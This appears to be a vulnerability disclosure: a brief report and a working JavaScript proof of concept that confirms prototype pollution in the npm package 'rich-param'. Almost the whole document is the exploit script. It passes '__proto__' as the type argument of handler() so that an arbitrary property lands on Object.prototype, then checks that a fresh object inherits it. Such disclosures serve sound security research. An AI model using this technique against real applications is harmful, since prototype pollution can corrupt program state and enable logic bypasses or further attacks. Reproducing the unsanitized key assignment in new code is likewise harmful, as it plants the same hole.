Confirmed prototype pollution via `handler(type, name, fn)` writing to `this.handlers[type][name]` without checking for `__proto__`.

```javascript
const Param = require("./node_modules/rich-param");

const param = new Param("test", "value");

// handler(type, name, fn) does this.handlers[type][name] = fn with no key sanitization.
// Passing type = "__proto__" walks onto Object.prototype instead of this.handlers.
param.handler("__proto__", "polluted", "yes");

const victim = {};
console.log("Prototype polluted:", victim.polluted === "yes");
if (victim.polluted !== "yes") {
  throw new Error("Exploit failed: prototype pollution did not occur");
}
```
